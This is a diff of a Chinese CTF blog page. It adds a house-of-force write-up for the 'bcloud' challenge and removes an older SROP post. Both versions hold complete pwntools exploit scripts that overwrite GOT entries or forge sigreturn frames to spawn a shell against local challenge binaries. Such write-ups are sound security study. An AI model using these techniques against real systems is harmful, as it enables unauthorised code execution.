+<p>为了 <code>getshell</code>, 还差一个 <code>libc</code> 的地址，然而程序里面没有提供 输出的功能，我们可以把 <code>free@got</code> 改成  <code>puts@plt</code>, 之后调用 <code>free(ptr)</code> 就是 <code>puts(ptr)</code> ， 而 <code>ptr</code> 使我们可控的</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521629607419q8qwrs9v.png?imageslim" alt="paste image"></p>
+<p>于是任意地址读实现。</p>
+<p>整理一下利用过程</p>
+<ul>
+<li><code>get_name</code> 处利用漏洞，拿到 <code>heap</code> 的地址，计算 <code>top chunk</code> 的地址</li>
+<li><code>house of force</code> 分配到 <code>note_ptr_table</code> 的地址</li>
+<li>利用 <code>edit</code> 功能实现任意地址写</li>
+<li>把<code>free@got</code> 改成  <code>puts@plt</code>，实现任意地址读</li>
+<li>读 <code>puts@got</code> 拿到 <code>libc</code> 的基地址</li>
+<li>修改 <code>aoti@got</code> 为 <code>system</code></li>
+<li>发送 <code>sh</code> , 触发 <code>aoti(&quot;sh&quot;)</code>, 实际执行的是 <code>system(&quot;sh&quot;)</code></li>
+</ul>
+<p>最后的 <code>exp</code></p>
 <p>参考：</p>
-<p><a href="http://blog.csdn.net/qq_29343201/article/details/72627439" target="_blank" rel="external">http://blog.csdn.net/qq_29343201/article/details/72627439</a></p>
-<p>完整的 <code>exp</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">from time import sleep</div><div class="line">context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;)</div><div class="line"></div><div class="line">p = process(&quot;./smallest&quot;)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"># gdb.attach(p, &apos;&apos;&apos;</div><div class="line"># bp *0x004000BE </div><div class="line"></div><div class="line"># 	&apos;&apos;&apos;)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">again = 0x4000B0         #xor     rax, rax</div><div class="line">rdi_rsi_sys = 0x04000BB  # mov     rdi, rax</div><div class="line"></div><div class="line">payload = p64(again)</div><div class="line">payload += p64(rdi_rsi_sys)</div><div class="line">payload += p64(again)  # addr for after leak</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">sleep(0.2)</div><div class="line"></div><div class="line">log.info(&quot;set stack for call write(1,....)&quot;)</div><div class="line"># pause()</div><div class="line"></div><div class="line">p.send(&apos;\xbb&apos;)</div><div class="line">data = p.recv()</div><div class="line">sleep(0.2)</div><div class="line"></div><div class="line">stack_addr = u64(data[0x10:0x18]) - 0x253</div><div class="line">log.info(hex(stack_addr))</div><div class="line"></div><div class="line">log.info(&quot;set rax=1, and ret to rdi_rsi_sys to call write(1,....)&quot;)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"># pause()</div><div class="line"></div><div class="line"></div><div class="line"># swtch rsp ---&gt; to leak addr, for get /bin/sh addr</div><div class="line"></div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rsp = stack_addr # after sigretrun, rsp</div><div class="line">frame.rip = again    # ret to begin</div><div class="line">payload = p64(again)</div><div class="line">payload += &apos;d&apos; * 8</div><div class="line">payload += str(frame)</div><div class="line"></div><div class="line">sleep(0.2)</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line"></div><div class="line">syscall_addr = 0x04000BE </div><div class="line"></div><div class="line">payload = p64(syscall_addr)</div><div class="line">payload += &apos;\x11&apos; * (15 - len(payload))</div><div class="line"></div><div class="line">pause()</div><div class="line">sleep(0.2)</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">log.info(&quot;switch stack done&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line">payload = p64(again)</div><div class="line">payload += &quot;B&quot; * 8</div><div class="line"></div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rsp = stack_addr # after sigretrun, rsp</div><div class="line">frame.rip = syscall_addr    # ret to begin</div><div class="line"></div><div class="line">frame.rax = 59</div><div class="line"></div><div class="line">frame.rdi = stack_addr + 0x10 + 0xf8</div><div class="line"></div><div class="line">payload += str(frame)</div><div class="line">payload += &quot;/bin/sh\x00&quot;</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">payload = p64(syscall_addr)</div><div class="line">payload += &apos;\x11&apos; * (15 - len(payload))</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p><a href="http://uaf.io/exploitation/2016/03/20/BCTF-bcloud.html" target="_blank" rel="external">http://uaf.io/exploitation/2016/03/20/BCTF-bcloud.html</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div></pre></td><td class="code"><pre><div class="line">#/usr/bin/env python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line"># context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</div><div class="line">context(log_level=&apos;debug&apos;)</div><div class="line">p = process(&quot;./bcloud&quot;)</div><div class="line"></div><div class="line">gdb.attach(p,&apos;&apos;&apos;</div><div class="line">bp 0x08048829</div><div class="line">c</div><div class="line">    &apos;&apos;&apos;)</div><div class="line">pause()</div><div class="line"></div><div class="line">p.recvuntil(&quot;Input your name:&quot;)</div><div class="line">p.send(&quot;a&quot; * 0x40)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">p.recv(0x44)</div><div class="line">p.recv(0x44)</div><div class="line">heap = u32(p.recv(4)) - 0x8</div><div class="line">top_chunk_addr = heap + 216</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">log.info(&quot;got heap: &quot; + hex(heap))</div><div class="line">log.info(&quot;got top_chunk_addr: &quot; + hex(top_chunk_addr))</div><div class="line">pause()</div><div class="line"></div><div class="line">p.recvuntil(&quot;Org:&quot;)</div><div class="line">p.send(&quot;b&quot; * 0x40)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">payload = p32(0xffffffff)  #  top chunk 的 size 位</div><div class="line">payload += &quot;c&quot; * (0x40 - len(payload))</div><div class="line">p.recvuntil(&quot;Host:&quot;)</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">bss_addr = 0x0804B120   #  note_ptr_table 的地址</div><div class="line">evil_size = bss_addr - 8 - top_chunk_addr -8 # 计算一个size , 用于在第二次 malloc 是返回 bss_addr</div><div class="line">log.info(&quot;evil_size: &quot; + hex(evil_size))</div><div class="line">log.info(&quot;set top chunk size: 0xffffffff&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line">p.recvuntil(&quot;option---&gt;&gt;&quot;)</div><div class="line">p.sendline(&quot;1&quot;)</div><div class="line">p.recvuntil(&quot;note content:&quot;)</div><div class="line">p.sendline(str(evil_size - 4))   # malloc(len + 4), note0</div><div class="line">p.recvuntil(&quot;Input the content:&quot;)</div><div class="line">p.sendline(&quot;a&quot; * 4)</div><div class="line"></div><div class="line">p.recvuntil(&quot;option---&gt;&gt;&quot;)</div><div class="line">p.sendline(&quot;1&quot;)</div><div class="line">p.recvuntil(&quot;note content:&quot;)</div><div class="line">p.sendline(str(0x40))       #  此时分配到 note1,  note1 ---&gt; bss_addr</div><div class="line">p.recvuntil(&quot;Input the content:&quot;)</div><div class="line"></div><div class="line">free_got = 0x0804B014</div><div class="line">puts_plt = 0x08048520</div><div class="line">puts_got = 0x0804B024</div><div class="line">payload = p32(free_got)</div><div class="line">payload += p32(bss_addr)  # 为了维持控制，使得 note_ptr_table[1] 的值始终为 note_ptr_table 的地址</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line"></div><div class="line">## note 2</div><div class="line">p.recvuntil(&quot;option---&gt;&gt;&quot;)</div><div class="line">p.sendline(&quot;1&quot;)</div><div class="line">p.recvuntil(&quot;note content:&quot;)</div><div class="line">p.sendline(str(0x40))</div><div class="line">p.recvuntil(&quot;Input the content:&quot;)</div><div class="line">p.sendline(&quot;a&quot; * 4)</div><div class="line"></div><div class="line"></div><div class="line">log.info(&quot;note0---&gt;free@got , note1---&gt;ptr_table&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line">p.recvuntil(&quot;option---&gt;&gt;&quot;)</div><div class="line">p.sendline(&quot;3&quot;)</div><div class="line">p.recvuntil(&quot;Input the id:&quot;)</div><div class="line">p.sendline(str(1))</div><div class="line">p.recvuntil(&quot;Input the new content:&quot;)</div><div class="line"></div><div class="line">payload = p32(free_got)</div><div class="line">payload += p32(bss_addr)</div><div class="line">payload += p32(free_got)   # target addr , 要写的地址</div><div class="line">payload += p32(puts_got)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.recvuntil(&quot;option---&gt;&gt;&quot;)</div><div class="line">p.sendline(&quot;3&quot;)</div><div class="line">p.recvuntil(&quot;Input the id:&quot;)</div><div class="line">p.sendline(str(2))</div><div class="line">p.recvuntil(&quot;Input the new content:&quot;)</div><div class="line">p.sendline(p32(puts_plt))   # data to write，要写的数据</div><div class="line"></div><div class="line">log.info(&quot;free@got ---&gt; puts_plt&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">p.recvuntil(&quot;option---&gt;&gt;&quot;)</div><div class="line">p.sendline(&quot;4&quot;)</div><div class="line">p.recvuntil(&quot;Input the id:&quot;)</div><div class="line">p.sendline(str(3))</div><div class="line"></div><div class="line"> </div><div class="line"></div><div class="line">libc = u32(p.recvuntil(&quot;Delete success.&quot;)[1:5]) - 0x5fca0</div><div class="line">system = libc + 0x3ada0</div><div class="line">log.info(&quot;libc: &quot; + hex(libc))</div><div class="line">log.info(&quot;system: &quot; + hex(system))</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">p.recvuntil(&quot;option---&gt;&gt;&quot;)</div><div class="line">p.sendline(&quot;3&quot;)</div><div class="line">p.recvuntil(&quot;Input the id:&quot;)</div><div class="line">p.sendline(str(1))</div><div class="line">p.recvuntil(&quot;Input the new content:&quot;)</div><div class="line"></div><div class="line"></div><div class="line">aoti_got = 0x0804B03C </div><div class="line">payload = p32(free_got)</div><div class="line">payload += p32(bss_addr)</div><div class="line">payload += p32(aoti_got)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line"></div><div class="line">p.recvuntil(&quot;option---&gt;&gt;&quot;)</div><div class="line">p.sendline(&quot;3&quot;)</div><div class="line">p.recvuntil(&quot;Input the id:&quot;)</div><div class="line">p.sendline(str(2))</div><div class="line">p.recvuntil(&quot;Input the new content:&quot;)</div><div class="line">p.sendline(p32(system))</div><div class="line"></div><div class="line"></div><div class="line">log.info(&quot;aoti---&gt;system&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line">p.sendline(&quot;sh&quot;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
         
                 <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
                     <p><strong>
@@ -567,7 +604,7 @@
                             <a>本站文章均原创， 转载注明来源</a>
                         </strong>
                         <br>
-                        <strong>本文链接：</strong><a href="http://blog.hac425.top/2017/12/16/pwn_with_srop.html">http://blog.hac425.top/2017/12/16/pwn_with_srop.html</a>
+                        <strong>本文链接：</strong><a href="http://blog.hac425.top/2018/03/21/tack_top_chunk_bcloud.html">http://blog.hac425.top/2018/03/21/tack_top_chunk_bcloud.html</a>
                     </p>
                 </blockquote>
         
@@ -617,21 +654,13 @@
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/2017/12/17/pwn_with_format_decoder.html" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            新篇
-        </a>
-    
 
     <!-- Section Spacer -->
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
     
-        <a href="/2017/12/16/syscall_to_rop.html" id="post_nav-older" class="next-content">
+        <a href="/2018/03/20/pwn_with_longjmp.html" id="post_nav-older" class="next-content">
             旧篇
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
